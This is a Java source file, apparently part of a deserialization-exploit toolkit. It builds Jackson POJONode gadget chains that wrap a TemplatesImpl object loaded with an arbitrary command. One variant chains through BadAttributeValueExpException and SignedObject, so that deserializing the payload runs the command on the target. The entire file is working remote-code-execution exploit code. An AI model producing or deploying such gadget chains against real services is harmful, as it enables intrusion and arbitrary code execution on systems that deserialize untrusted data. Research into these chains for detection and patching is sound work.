package xyz.eki.marshalexp.gadget.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import xyz.eki.marshalexp.gadget.jdk.GBadAttributeValueExpException;
import xyz.eki.marshalexp.gadget.jdk.GSignedObject;
import xyz.eki.marshalexp.sink.jdk.GTemplates;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.security.SignedObject;

public class GJackson {
    public static POJONode toString2Getter(Object obj){
        POJONode jsonNodes = new POJONode(obj);
        return jsonNodes;
    }

    public static POJONode toString2RCE(String cmd) throws Exception {
        TemplatesImpl evilTemplates = GTemplates.getEvilTemplates(cmd);
        POJONode jsonNodes = new POJONode(evilTemplates);
        return jsonNodes;
    }

    public static POJONode toString2RCEWithSignedObject(String cmd) throws Exception {
        TemplatesImpl evilTemplates = GTemplates.getEvilTemplates(cmd);
        POJONode jsonNodes1 = new POJONode(evilTemplates);
        BadAttributeValueExpException e = GBadAttributeValueExpException.deserialize2ToString(jsonNodes1);
        SignedObject signedObject = GSignedObject.getter2Deserialize(e);
        POJONode jsonNodes2 = new POJONode(signedObject);
        return jsonNodes2;
    }
}
